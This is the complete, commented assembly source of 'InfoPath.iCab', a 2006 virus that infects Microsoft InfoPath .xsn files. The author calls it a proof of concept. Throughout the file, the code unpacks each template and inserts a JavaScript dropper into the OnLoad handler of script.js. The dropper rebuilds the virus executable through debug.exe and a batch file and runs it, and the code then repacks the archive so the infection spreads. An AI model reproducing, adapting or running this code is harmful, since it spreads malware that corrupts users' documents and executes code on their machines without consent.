;;;;;;;;;;;;;;;;;;;;;;;;;;;;[Infopath.iCab];;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;  InfoPath.iCab
;;  by Second Part To Hell
;;  www.spth.de.vu
;;  spth@priest.com
;;  written in February-March 2006
;;
;;  This virus is a binary macro-virus for Infopath.
;;  Microsoft Office Infopath is (as the name already says it) in the Office-packet
;;  since Office 2003.
;;
;;  The virus infects any .xsn file with JS macros (standard). It hooks the
;;  XDocument::OnLoad Function. If this function does not exist, the file stays uninfected.
;;
;;  A .xsn file is a cabinet-archive including several files (like .gifs, .xsf, .html, .js).
;;
;;  My virus searchs for any .xsn file in the current directory.
;;  When it finds an file:
;;  -> extracts the file
;;  -> searchs the script.js (exists as standard)
;;  -> searchs the OnLoad-Function
;;  -> Write a dropper and itself as hex-values to the file
;;  -> Closes the file
;;  -> Make a new cabinet file
;;
;;  More about Infopath and viruses, see my article about it in rRlf#7.
;;
;;  Nothing more to say - see the (commented) source now :)
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;[Infopath.iCab];;;;;;;;;;;;;;;;;;;;;;;;;;;;

include 'E:\Mario\Programme\fasm\INCLUDE\win32ax.inc'

	xsn_function_data_length	EQU	xsn_function_data_end-xsn_function_data
	xsn_dropper_code_before_length	EQU	xsn_dropper_code_b_end-xsn_dropper_code_before
	xsn_dropper_code_after_length	EQU	xsn_dropper_code_a_end-xsn_dropper_code_after
	extrac32_data_length		EQU	end_extrac32_data-extrac32_data
	MAX_PATH			EQU	256
.data
	dwMyFileName		dd 0x0
	hCreateFileHandle	dd 0x0
	hCreFiMapping		dd 0x0

	stTempFile		db 'iCab.tmp', 0x0
	stTempDir		db 'iCab', 0x0
	stDotDot		db '..', 0x0
	stAnyFile		db '*.*', 0x0
	hSearchHandleAnyFile	dd 0x0

	stMakeCAB		db 'makecab /F '
	stDirective		db 'iCabdire.txt', 0x0
	stDirectiveDir		db 'Disk1', 0x0

	stDirectiveTrash1	db 'setup.inf',0x0
	stDirectiveTrash2	db 'setup.rpt',0x0

	infectedCab		db 'disk1/1.cab',0x0
	stScriptJS		db 'script.js',0x0
	hCreFiScriptJS		dd 0x0
	dwFileSizeScriptJS	dd 0x0
	hCreFiMapScriptJS	dd 0x0
	dwMapViewScriptJS	dd 0x0
	dwStartOfOnLoad 	dd 0x0

	hDirectiveFile		dd 0x0
	dwFileSize		dd 0x0
	dwMapViewOffset 	dd 0x0
	dwCounter		dd 0x0
	dwMemAlloc		dd 0x0
	dwMemAlloc2		dd 0x0
	dwSplitCounter		dd 0x300
	stSplitCounter		db '0110'
	hex_code_length2	dd 0x0
	hDirectiveSearch	dd 0x0

	dwDirectiveCounter	dd 0x0

	trash_counter		dd 0x0
	bin2hex:
	bin2hex_1		db 0x0
	bin2hex_2		db 0x0
				db 0x0

	byteswritten		dd 0x0

	hex_code_length 	dd 0x0
	FALSE_F 		dd 0x0

	trash:	 times 8 dd 0x0

	xsn_extention		db '*.xsn', 0x0
	xsn_search_handle	dd 0x0
	xsn_function_data	db 'function XDocument::OnLoad(eventObj)'
	xsn_function_data_end:

	xsn_dropper_code_before db 'var fso,shell,nxln,wsc,filee;'
				db 'nxln=String.fromCharCode(13,10);'
				db 'fso=new ActiveXObject("Scripting.FileSystemObject");'
				db 'file=fso.CreateTextFile("C:\\iCab.txt", true);'
				db 'file.write("e 0100'
	xsn_dropper_code_b_end:
	xsn_dropper_code_after	db '"+nxln+"rcx"+nxln+"2000"+nxln+"n C:\\iCab.dmp"+nxln+"w"+nxln+"q");file.Close();'
				db 'shell=new ActiveXObject("WScript.Shell");filee=fso.CreateTextFile("C:\\test.bat");'
				db 'filee.Write("debug<C:\\iCab.txt"+nxln+"ren C:\\iCab.dmp C:\\iCab.exe");'
				db 'filee.Close();'
				db 'shell.Run("C:\\test.bat");'
				db "var msg;var rand=Math.round(Math.random()*10);"
				db "if (rand==0) { msg='Let the bells of freedom ring!\n - (Magician'+String.fromCharCode(39)+'s Birthday by Uriah Heep)'; }"
				db "if (rand==1) { msg='No Gods, No Masters - Against all Authority: ANARCHISM!'; }"
				db "if (rand==2) { msg='Freedom is just another word for nothing left to lose!\n - (Me And Bobby McGee by Janis Joplin)'; }"
				db "if (rand==3) { msg='I'+String.fromCharCode(39)+'m not a prisoner - I'+String.fromCharCode(39)+'m a FREE man!\n - (The Prisoner by Iron Maiden)'; }"
				db "if (rand==4) { msg='Sometime they will give a war and nobody will come!\n - (by Carl Sandberg)'; }"
				db "if (rand==5) { msg='Fighting for peace is like fucking for virginity!'; }"
				db "if (rand==6) { msg='The easiest way to gain control of the population is to carry out acts of terror the public will clamor for such laws if the personal security is threatened.\n - (by Joseph Stalin)'; }"
				db "if (rand==7) { msg='Our Word is Our Weapon.\n - (by Subcomandante Marcos)'; }"
				db "if (rand==8) { msg='I do not know with what weapons World War III will be fought, but World War IV will be fought with sticks and stones.\n - (by Albert Einstein)'; }"
				db "if (rand==9) { msg='Imagine all the people living life in PEACE!\n - (Imagine by John Lennon)'; }"
				db "if (rand==9) { msg='This proof-of-concept Infopath virus has been done by [Second Part To Hell/rRlf]\nhttp://www.rrlf.de.vu/\nhttp://www.spth.de.vu/'; }"
				db "XDocument.UI.Alert(msg);"
				db 'if (fso.FileExists("C:\\iCab.exe")) { fso.DeleteFile("C:\\iCab.exe"); }'
				db 'if (fso.FileExists("C:\\test.bat")) { fso.DeleteFile("C:\\test.bat"); }'
				db 'if (fso.FileExists("C:\\ICAB.DMP")) { fso.CopyFile("C:\\ICAB.DMP","C:\\iCab.exe"); }'
				db 'if (fso.FileExists("C:\\ICAB.DMP")) { fso.DeleteFile("C:\\ICAB.DMP"); }'
				db 'shell.Run("C:\\iCab.exe");'
	xsn_dropper_code_a_end:

	dwMemAllocInf		dd 0x0

	extrac32_data		db '\extrac32.exe /e /a "'
	end_extrac32_data:

	system_dir_buffer:	times MAX_PATH db 0x0
	extrac32_data_buffer:	times 256      db 0x0
	end_of_system_dir	dd 0x0

WIN32_FIND_DATA:
	dwFileAttributes   dd ?
	ftCreationTime	   FILETIME
	ftLastAccessTime   FILETIME
	ftLastWriteTime    FILETIME
	nFileSizeHigh	   dd ?
	nFileSizeLow	   dd ?
	dwReserved0	   dd ?
	dwReserved1	   dd ?
	cFileName:	   times 260 db 0x0
	cAlternateFileName:times  14 db 0x0
;end WIN32_FIND_DATA

WIN32_FIND_DATA_2:
	_dwFileAttributes    dd ?
	_ftCreationTime      FILETIME
	_ftLastAccessTime    FILETIME
	_ftLastWriteTime     FILETIME
	_nFileSizeHigh	     dd ?
	_nFileSizeLow	     dd ?
	_dwReserved0	     dd ?
	_dwReserved1	     dd ?
	_cFileName:	     times 260 db 0x0
	_cAlternateFileName: times 14 db 0x0
;end WIN32_FIND_DATA_2

STARTUPINFO_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0
;end STARTUPINFO

PROCESS_INFORMATION_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0
;end PROCESS_INFORMATION

.code
start:
	invoke	GetCommandLine				; Get my own filename
	inc	eax					; Delete first '"'
	mov	[dwMyFileName], eax			; Save my filename

    check_for_dot:
	inc	eax					; Increase pointer
	cmp	byte [eax], '.' 			; Check for dot
    jne check_for_dot					; If not found, search next

	mov	byte [eax+4], 0x0			; Delete last '"'

	invoke	CopyFile, \				; Create a temp file
		[dwMyFileName], \
		stTempFile, \
		FALSE					; Overwrite if exist

	invoke	CreateFile, \				; Open the own file
		stTempFile, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hCreateFileHandle], eax

	invoke	GetFileSize, \				; Get the filesize of the own file
		[hCreateFileHandle], \
		dwFileSize
	mov	[dwFileSize], eax

	invoke	CreateFileMapping, \			; Create Filemapping of own file
		[hCreateFileHandle], \
		0x0, \
		PAGE_READWRITE, \
		0x0, \
		[dwFileSize], \
		0x0
	mov	[hCreFiMapping], eax

	invoke	MapViewOfFile, \			; Map the own file into memory
		[hCreFiMapping], \
		FILE_MAP_ALL_ACCESS, \
		0x0, \
		0x0, \
		[dwFileSize]
	mov	[dwMapViewOffset], eax

	invoke	VirtualAlloc, \ 			; Get 64KB Memory
		0x0, \
		0x10000, \
		0x1000, \
		0x4
	mov	[dwMemAlloc], eax


   MakeToHex_loop:
	mov	ebx, [dwCounter]			; ebx=Counter
	add	ebx, [dwMapViewOffset]			; ebx=MapView+counter
	mov	al, byte [ebx]				; al=[MapView+counter]

	call	MakeToHex				; Make al to Hex (retrunvalue in ax)
	push	ax					; Save ax (hex number)
	xor	eax, eax				; eax=0x0
	mov	eax, [dwCounter]			; eax=dwCounter
	mov	bx, 3					; bx=5
	mul	bx					; DX:AX=AX*BX
	add	eax, [dwMemAlloc]			; eax=3*counter+MemoryAddresse
	mov	byte [eax],' '				; [eax]="0x",0x0
	xchg	ebx, eax				; ebx=eax
	pop	ax					; Get Hex-Number from Stack
	mov	word [ebx+1], ax			; [ebx]= Hex number - for example: "0xFF"

	inc	[dwCounter]				; Increase Counter
	mov	eax, [dwFileSize]			; eax=Filesize
	cmp	[dwCounter], eax			; Compare Counter with Filesize
   jl	MakeToHex_loop					; If less, continue converting

	mov	eax, [dwCounter]
	mov	bx, 3
	mul	bx
	mov	[hex_code_length], eax			; Save length of hex-code

	invoke	UnmapViewOfFile, \			; Close MapView
		[dwMapViewOffset]

	invoke	CloseHandle, \				; Close CreateMap
		[hCreFiMapping]

	invoke	CloseHandle, \				; Close Temp File
		[hCreateFileHandle]

	invoke	DeleteFile, \				; Delete Temp File
		stTempFile

	invoke	VirtualAlloc, \ 			; Get 64KB Memory
		0x0, \
		0x10000, \
		0x1000, \
		0x4
	mov	[dwMemAlloc2], eax

	call	CreateDumpCode				; Create The Hex-Dump code

	invoke	CreateDirectory, \			; Create Temp Directory
		stTempDir, \
		0x0

	invoke	FindFirstFile, \			; Find First *.xsn File
		xsn_extention, \
		WIN32_FIND_DATA
	mov	[xsn_search_handle], eax		; Save Search-Handle
	cmp	eax, INVALID_HANDLE_VALUE		; No File Found?
	je	EndOfVirus				; Jmp To End Of Virus

   infection_of_xsn_file:

	mov	[dwDirectiveCounter], 0x0

	mov	eax, system_dir_buffer
	mov	ecx, MAX_PATH
	call	FillBufferWithZero

	call	CopyVictimToTempDir			; Copy the victim to the temp-Directory

	invoke	CreateFile, \
		stDirective, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hDirectiveFile], eax			; The directive File will be needed for creating the .cab

	invoke	SetCurrentDirectory, \			; Set the current Directory to temp-Directory
		stTempDir

	call	GenerateExtrac32String			; Generate the extrac32 String


	invoke	CreateProcess, \			; Execute the extrac32-string
		0x0, \					; Now the extracted version of the victim is in the temp-direcory
		system_dir_buffer, \
		0x0, \
		0x0, \
		FALSE, \
		0x0, \
		0x0, \
		0x0, \
		STARTUPINFO_struct, \
		PROCESS_INFORMATION_struct

	invoke	Sleep, \				; Wait 0.5 Seconds - Wait for the extrac32.exe
		500

	invoke	DeleteFile, \				; Delete the temporary copy of the victim in 'iCab\'
		cFileName

	invoke	CreateFile, \				; Open script.js
		stScriptJS, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hCreFiScriptJS], eax
	cmp	eax, INVALID_HANDLE_VALUE
	je	DontInfect

	invoke	GetFileSize, \				; Get the filesize of the own file
		[hCreFiScriptJS], \
		dwFileSize
	mov	[dwFileSizeScriptJS], eax

	invoke	CreateFileMapping, \			; Create Filemapping of own file
		[hCreFiScriptJS], \
		0x0, \
		PAGE_READWRITE, \
		0x0, \
		[dwFileSizeScriptJS], \
		0x0
	mov	[hCreFiMapScriptJS], eax

	invoke	MapViewOfFile, \			; Map the own file into memory
		[hCreFiMapScriptJS], \
		FILE_MAP_ALL_ACCESS, \
		0x0, \
		0x0, \
		[dwFileSizeScriptJS]
	mov	[dwMapViewScriptJS], eax

	call	SearchOnLoadInScriptJS			; Search for the OnLoad-Function entry
	call	CheckIfAlreadyInfected			; Check if already infected
	call	Generate_infected_code			; Generate the fully infected code

	invoke	UnmapViewOfFile, \
		[dwMapViewScriptJS]

	invoke	CloseHandle, \
		[hCreFiMapScriptJS]

	invoke	CloseHandle, \
		[hCreFiScriptJS]

	invoke	DeleteFile, \
		stScriptJS

	invoke	CreateFile, \
		stScriptJS, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hCreFiScriptJS], eax

	mov	ecx, [dwFileSizeScriptJS]
	add	ecx, xsn_dropper_code_before_length
	add	ecx, xsn_dropper_code_after_length
	add	ecx, [hex_code_length2]

	invoke	WriteFile, \			; Write the script.JS including the virus
		[hCreFiScriptJS], \
		[dwMemAllocInf], \
		ecx, \
		FALSE_F, \
		0x0

	invoke	CloseHandle, \
		[hCreFiMapScriptJS]

	invoke	CloseHandle, \
		[hCreFiScriptJS]		; Close the script.JS File

	invoke	FindFirstFile, \		; Find all files of the xsn - for compress them again
		stAnyFile, \			; used for the directive-file
		WIN32_FIND_DATA_2
	mov	[hDirectiveSearch], eax

	call	MakeDirectiveFile

	invoke	FindClose, \
		[hDirectiveSearch]

	invoke	WriteFile, \			; Write the content of the Directive-File for makecab
		[hDirectiveFile], \
		[dwMemAllocInf], \
		[dwDirectiveCounter], \
		FALSE_F, \
		0x0

	invoke	CloseHandle, \
		[hDirectiveFile]

	invoke	SetCurrentDirectory, \
		stDotDot

	invoke	CreateProcess, \			; Execute the makecab-string
		0x0, \					; Now the .cab file is in "disk1/1.cab"
		stMakeCAB, \
		0x0, \
		0x0, \
		FALSE, \
		0x0, \
		0x0, \
		0x0, \
		STARTUPINFO_struct, \
		PROCESS_INFORMATION_struct

	invoke	Sleep, \				; You have 1 second for running
		1000

	invoke	DeleteFile, \				; Delete the Setup-File (setup.inf)
		stDirectiveTrash1

	invoke	DeleteFile, \				; Delete the Setup-File (setup.rpt)
		stDirectiveTrash2

	invoke	DeleteFile, \
		stDirective

	invoke	CopyFile, \
		infectedCab, \
		cFileName, \
		FALSE

	invoke	DeleteFile, \
		infectedCab

	mov	byte [infectedCab+5], 0x0

	invoke	RemoveDirectory, \
		infectedCab

	mov	byte [infectedCab+5], '/'

	invoke	SetCurrentDirectory, \
		stTempDir

jmp	DontInfect

Not_Infect:					; Jump Over!!!!

	invoke	UnmapViewOfFile, \
		[dwMapViewScriptJS]

	invoke	CloseHandle, \
		[hCreFiMapScriptJS]

	invoke	CloseHandle, \
		[hCreFiScriptJS]

	invoke	CloseHandle, \
		[hDirectiveFile]

	invoke	DeleteFile, \
		stDirective

DontInfect:
	call	DeleteAnyFileInDirectory		; Delete any file in the temp Directory (because only empty Dirs can be deleted

	invoke	SetCurrentDirectory, \			; Set current directory to the old one
		stDotDot

	invoke	FindNextFile, \
		[xsn_search_handle], \
		WIN32_FIND_DATA
	cmp	eax, 0x0
	jne	infection_of_xsn_file


	invoke	FindClose, \				; Close the Find
		[xsn_search_handle]

EndOfVirus:
	invoke	RemoveDirectory, \			; Delete the temp Directory
		stTempDir

	invoke	VirtualFree, \
		dwMemAlloc, \
		0x0, \
		MEM_RELEASE, \

	invoke	ExitProcess, \
		0x0


MakeToHex:
; Convert a binary byte to a hex-number
; In:  al = binary byte
; Out: ax = hex-value
; Nothing else changed
	mov	word [bin2hex], 0x3030		; Code of "00"
	mov	ah, al				; ah=al
	and	al, 0x0F			; al=0000 ????

	push	binary_to_hex_RJ_1		; Offset of return jmp to stack

	cmp	al, 0x0A			; Is al > 10
	jge	bin2hex_inc_al			; If yes, increase AL:
						; ASCII '0' = 0x30
						; ASCII '9' = 0x39
						; ASCII 'A' = 0x41
						; 'A'-'9' = 0x41-0x39 = 8-1 = 7

	mov	[trash_counter], ebx		 ; We did not need the retrun value
	pop	ebx				 ; Get it back
	mov	ebx, [trash_counter]		 ; Restore ebx

   binary_to_hex_RJ_1:
	add	byte [bin2hex_2], al		; '0'+al

	shr	ah, 4				; ah = ???? ---- -> 0000 ????
	mov	al, ah				; al = ah

	push	binary_to_hex_RJ_2

	cmp	al, 0x0A
	jge	bin2hex_inc_al

	mov	[trash_counter], ebx
	pop	ebx
	mov	ebx, [trash_counter]
   binary_to_hex_RJ_2:
	add	byte [bin2hex_1], al

	mov	ax, word [bin2hex]		; HEX-value to ax
ret

bin2hex_inc_al:
	add	al, 7				; al += 7  <- If al > "9" then ASCII-number + 7
ret



DeleteAnyFileInDirectory:
; Removed all files in current Directory
; In: Nothing
; Out: Anything changed

	invoke	FindFirstFile, \		; Find *.* files
		stAnyFile, \
		WIN32_FIND_DATA
	mov	[hSearchHandleAnyFile], eax	; Save Searchhandle

   DeleteTempDirFiles:
	invoke	DeleteFile, \			; Delete any found file
		cFileName

	invoke	FindNextFile, \ 		; Search next file
		[hSearchHandleAnyFile], \
		WIN32_FIND_DATA
	cmp	eax, 0x0
   jne	DeleteTempDirFiles

	invoke	FindClose, \			; Close Filesearching
		[hSearchHandleAnyFile]
ret



GenerateExtrac32String:
; Generate String to extract the xsn file: %system%\extrac32.exe /e /a "%victim%"
; cFileName = Filename of victim
; Out: Anything changed

	invoke	GetSystemDirectory, \		; Get the path of System Directory
		system_dir_buffer, \
		MAX_PATH

	xor	ecx, ecx			; ecx=0x0
   find_end_of_system_dir:			; Find end of System-Directory-Path
	inc	ecx				; Increase ecx
	mov	eax, ecx			; eax=ecx
	add	eax, system_dir_buffer		; eax=system_dir_buffer+counter
	mov	al, byte [eax]			; al=[system_dir_buffer+counter]
	cmp	al, 0x0 			; al=0x0?
   jne	find_end_of_system_dir			; If not, continue searching

	mov	eax, system_dir_buffer		; eax=system_dir_buffer
	add	eax, ecx			; eax=End of system dir path
	mov	[end_of_system_dir], eax	; Save eax

	mov	ecx, extrac32_data_length	; Write extrac32_data after system-path
	mov	esi, extrac32_data
	mov	edi, [end_of_system_dir]
	rep	movsb				; Write! system_dir may be 'C:\Windows\System\extrac32.exe /e /a "' now


	xor	ecx, ecx			; ecx=0x0
   find_end_of_filename:			; Find end of filename of victim
	inc	ecx				; Increase counter
	mov	eax, ecx			; eax=counter
	add	eax, cFileName			; eax=Victim-filename+counter
	mov	al, byte [eax]			; al=byte [Victim-filename+counter]
	cmp	al, 0x0 			; al=0x0?
   jne	find_end_of_filename			; If not, continue searching

	mov	esi, cFileName			; Write filename to end of system-string
	mov	edi, [end_of_system_dir]
	add	edi, extrac32_data_length
	rep	movsb				; Write! system_dir may be 'C:\Windows\System\extrac32.exe /e /a "victim.xsn'

	mov	byte [edi], '"' 		; system_dir may be 'C:\Windows\System\extrac32.exe /e /a "victim.xsn"'
ret



CopyVictimToTempDir:
; Copy the victim File to "iCab\"
; cFileName=Name Of Victim
; Anything changed
	mov	dword [cFileName-5], 'iCab'
	mov	byte [cFileName-1], '\'

	invoke	CopyFile, \
		cFileName, \
		cFileName-5, \
		FALSE
ret



SearchOnLoadInScriptJS:
; Writes offset of OnLoad-Function to [dwStartOfOnLoad]
; [dwMapViewScriptJS]=Pointer to MapView Of the Script.JS
; [xsn_function_data]=Data of function-start
; xsn_function_data_length= Length of OnLoad-function-string
	xor	ecx, ecx
   searchOnLoadLoop:
	mov	eax, [dwMapViewScriptJS]	; eax=MapView of script.js
	add	eax, ecx			; eax=current byte of MapView of script.js
	mov	eax, dword [eax]		; eax=4 Bytes of MapView
	inc	ecx				; Increase the counter
	cmp	ecx, dwFileSizeScriptJS 	; End of File
	jne	con_OnLoadLoop2 		; If not EOF, continue searching
	pop	eax				; Remove trash from stack
	jmp	Not_Infect			; Close all and find next file
     con_OnLoadLoop2:
	cmp	eax, "func"			; Is the current position a function?
   jne	searchOnLoadLoop			; If not, continue searching

	mov	eax, [dwMapViewScriptJS]
	add	eax, ecx

	xor	edx, edx
   continue_searchOnLoad_loop:
	mov	eax, [dwMapViewScriptJS]	; eax=MapView of script.js
	add	eax, ecx			; eax=current byte if MapView of script.js
	mov	al, byte [eax]			; al=One byte of Mapview of script.js
	inc	ecx				; Increase counter
	inc	edx				; Second counter
	mov	ebx, xsn_function_data		; ebx=xsn function_data
	add	ebx, edx			; ebx=current byte of xsn function data
	mov	bl, byte [ebx]			; bl=One byte of xsn function data
	cmp	al, bl				; compare if they are the same
	jne	searchOnLoadLoop		; If not the same, continue searching
	cmp	edx, xsn_function_data_length-1 ; End of the string?
   jl	continue_searchOnLoad_loop		; If not, continue searching


	mov	eax, [dwMapViewScriptJS]
	add	eax, ecx
   con_searchOL_2:
	inc	eax
	cmp	byte [eax], '{'
   jne	con_searchOL_2

	inc	eax
	mov	[dwStartOfOnLoad], eax	       ; Save the entry of the OnLoad-Function
ret



Generate_infected_code:
	invoke	VirtualAlloc, \
		0x0, \
		0x12000, \
		0x1000, \
		0x4
	mov	[dwMemAllocInf], eax

	mov	ecx, [dwStartOfOnLoad]
	sub	ecx, [dwMapViewScriptJS]
	mov	esi, [dwMapViewScriptJS]
	mov	edi, [dwMemAllocInf]
	rep	movsb

	mov	ecx, xsn_dropper_code_before_length
	mov	esi, xsn_dropper_code_before
;       mov     edi, [dwMemAllocInf+length of StartCodeOfVictim]           ; Already right value
	rep	movsb

	mov	ecx, [hex_code_length2]
	mov	esi, [dwMemAlloc2]
	rep	movsb

	mov	ecx, xsn_dropper_code_after_length
	mov	esi, xsn_dropper_code_after
	rep	movsb

	mov	ebx, [dwStartOfOnLoad]
	sub	ebx, [dwMapViewScriptJS]
	mov	ecx, [dwFileSizeScriptJS]
	sub	ecx, ebx
	mov	esi, [dwStartOfOnLoad]
	rep	movsb
ret



CreateDumpCode:
; In: [dwMemAlloc] = Hex Dump without breaks
;     [hex_code_length] = Length of Hex Dump
;     [dwSplitCounter] = Current position
;     [stSplitCounter] = Current position in ASCII
; Out: [dwMemAlloc2] = Hex Dump with breaks
;      [hex_code_length2] = Length of Hex Dump
; Splittes Hex Dump into 0x100-Bytes for debugging

	mov	ecx, 0x30
	mov	esi, [dwMemAlloc]
	add	esi, [dwSplitCounter]
	sub	esi, 0x300
	mov	edi, [dwMemAlloc2]
	add	edi, [hex_code_length2]
	rep	movsb

	mov	dword [edi], '"+nx'
	mov	dword [edi+4], 'ln+"'
	mov	word [edi+8], 0x2065	     ; LineBreak + "e "
	mov	eax, dword [stSplitCounter]
	mov	dword [edi+10], eax
	add	[dwSplitCounter], 0x30
	add	[hex_code_length2], 0x3E

	call	Increase_stSplitCounter

	mov	eax, [dwSplitCounter]
	sub	eax, 0x300
	cmp	eax, [hex_code_length]
	jl	CreateDumpCode

	mov	ecx, 0x30
	mov	esi, [dwMemAlloc]
	add	esi, [dwSplitCounter]
	sub	esi, 0x330
	mov	edi, [dwMemAlloc2]
	add	edi, [hex_code_length2]
	rep	movsb

	sub	[hex_code_length2], 0xE
ret



Increase_stSplitCounter:
	xor	dx, dx
	mov	eax, [dwSplitCounter]
	add	eax, 0x30
	mov	bx, 3
	div	bx
	push	ax			; Save ax
	call	MakeToHex
	mov	word [stSplitCounter+2], ax
	pop	ax
	xchg	al, ah
	call	MakeToHex
	mov	word [stSplitCounter], ax
ret


Search_End_Of_String:
; In: eax=Pointer to string
; Out: eax=Pointer to End Of String

	inc	eax
	cmp	byte [eax], 0x0
	jne	Search_End_Of_String
ret



MakeDirectiveFile:
	cmp	byte [_cFileName], '.'		; Is it '.' or '..'?
	je	MDF_FNF 			; If yes: Dont write that to directive file
	cmp	dword [_cFileName], 'iCab'	; Is it the Directive File itself?
	je	MDF_FNF 			; Also dont write that

	mov	eax, _cFileName
	call	Search_End_Of_String

	mov	dword [_cFileName-5], 'iCab'
	mov	byte [_cFileName-1], '\'

	mov	word [eax], 0x0A0D

	mov	ecx, eax
	add	ecx, 7				; "iCab\".length + 0x0A0D.length
	sub	ecx, _cFileName

	add	[dwDirectiveCounter], ecx

	mov	esi, _cFileName-5
	mov	edi, [dwMemAllocInf]
	add	edi, [dwDirectiveCounter]
	sub	edi, ecx
	rep	movsb

   MDF_FNF:
	invoke	FindNextFile, \
		[hDirectiveSearch], \
		WIN32_FIND_DATA_2
	cmp	eax, 0x0
	jne	MakeDirectiveFile
ret



CheckIfAlreadyInfected:
; Search for a string 'iCab'.
; If not infected, return at the usual way
; If infected, get the return value from stack (trash) and jmp to Not_infect
	mov	ebx, [dwMapViewScriptJS]
	xor	ecx, ecx

    loop_CheckIfAlreadyInfected:
	cmp	ecx, [dwFileSizeScriptJS]
	je	ret_CheckIfAlreadyInfected

	mov	eax, ebx
	add	eax, ecx
	mov	eax, dword [eax]

	inc	ecx

	cmp	eax, 'iCab'
    jne loop_CheckIfAlreadyInfected

	pop	eax
	jmp	Not_Infect

   ret_CheckIfAlreadyInfected:
ret

FillBufferWithZero:
; In: ecx: Size of Buffer
;     eax: Pointer to buffer

      mov	ebx, eax
      add	ebx, ecx
      mov	byte [ebx], 0x0
      loop	FillBufferWithZero
ret

.end start